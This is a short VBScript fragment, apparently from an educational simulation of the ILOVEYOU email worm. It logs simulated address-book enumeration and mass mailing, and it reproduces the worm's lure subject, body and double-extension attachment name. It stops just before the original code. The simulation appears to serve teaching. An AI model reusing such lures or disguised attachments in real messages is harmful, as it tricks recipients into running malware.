    ' Simulated email sending to demonstrate the propagation mechanism
    LogAction "SIMULATED: Would enumerate Outlook address book"
    LogAction "SIMULATED: Would send emails to all contacts"
    
    ' The crafted email had this structure:
    emailSubject = "ILOVEYOU"
    emailBody = "kindly check the attached LOVE LETTER😍"
    attachmentName = "LOVE-LETTER-FOR-YOU.TXT.vbs"
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
